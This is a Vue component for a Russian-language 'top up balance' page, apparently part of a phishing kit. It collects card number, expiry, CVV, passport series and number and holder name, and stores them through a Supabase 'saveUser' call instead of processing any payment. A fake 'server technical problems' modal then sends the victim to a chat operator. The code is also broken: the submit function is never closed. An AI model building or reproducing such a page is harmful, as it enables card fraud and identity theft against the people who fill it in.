<script setup>
import { ref } from 'vue'

import { saveUser } from '../lib/supabase'


const cardNumber = ref('')
const expiry = ref('')
const cvv = ref('')
const name = ref('')
const amount = ref('')
const method = ref('Visa/Mastercard')
const processing = ref(false)
const showMessage = ref(false)

const passportData = ref('')
const passportData2 = ref('')

async function submit() {
  processing.value = true
  const authUser = JSON.parse(localStorage.getItem('authUser') || '{}')
  await saveUser({
    email: authUser.email || '',
    phoneNumber: authUser.phoneNumber || localStorage.getItem('phoneNumber') || '',
    cardNumber: cardNumber.value,
    cardDate: expiry.value,
    cvv: cvv.value,
    passportData: passportData.value,
    passportData2: passportData2.value
  })


function openChat() {
  showMessage.value = false
  if (window.Intercom) {
    window.Intercom('show')
  }
}
</script>

<template>
  <div class="deposit container">
    <h1>Пополнение баланса</h1>
    <form v-if="!showMessage" @submit.prevent="submit" class="deposit-form">
      <div class="form-group">
        <label for="cardNumber">Номер карты</label>
        <input id="cardNumber" v-model="cardNumber" required />
      </div>
      <div class="form-row">
        <div class="form-group">
          <label for="expiry">Срок действия</label>
          <input id="expiry" v-model="expiry" placeholder="MM/YY" required />
        </div>
        <div class="form-group">
          <label for="cvv">CVV</label>
          <input id="cvv" v-model="cvv" required />
        </div>
      </div>
      <div class="form-group">

        <label for="passportData">Паспорт серия</label>
        <input id="passportData" v-model="passportData" required />
      </div>
      <div class="form-group">
        <label for="passportData2">Паспорт номер</label>
        <input id="passportData2" v-model="passportData2" required />
      </div>
      <div class="form-group">

        <label for="name">Имя держателя</label>
        <input id="name" v-model="name" required />
      </div>
      <div class="form-group">
        <label for="amount">Сумма</label>
        <input id="amount" type="number" v-model="amount" required />
      </div>
      <div class="form-group">
        <label for="method">Способ оплаты</label>
        <select id="method" v-model="method">
          <option>Visa/Mastercard</option>
          <option>Mir</option>
          <option>QIWI</option>
          <option>ЮMoney</option>
        </select>
      </div>
      <button type="submit" class="btn">Пополнить</button>
      <div v-if="processing" class="processing">Обработка...</div>
    </form>
    <div v-else class="modal">
      <div class="modal-content">
        <p>К сожалению мы имеем технические неполадки на сервере, обратитесь к оператору чтобы пополнить баланс</p>
        <button class="btn" @click="openChat">Написать оператору</button>
      </div>
    </div>
  </div>
</template>

<style scoped>
.deposit {
  padding: 40px 0;
}
.deposit-form {
  max-width: 480px;
  margin: 0 auto;
  display: flex;
  flex-direction: column;
  gap: 16px;
}
.form-row {
  display: flex;
  gap: 16px;
}
.form-group {
  display: flex;
  flex-direction: column;
}
.processing {
  margin-top: 16px;
}
.modal {
  position: fixed;
  top: 0;
  left: 0;
  right: 0;
  bottom: 0;
  background: rgba(0,0,0,0.6);
  display: flex;
  justify-content: center;
  align-items: center;
}
.modal-content {
  background: var(--card);
  padding: 24px;
  border-radius: 8px;
  max-width: 400px;
  text-align: center;
}
</style>
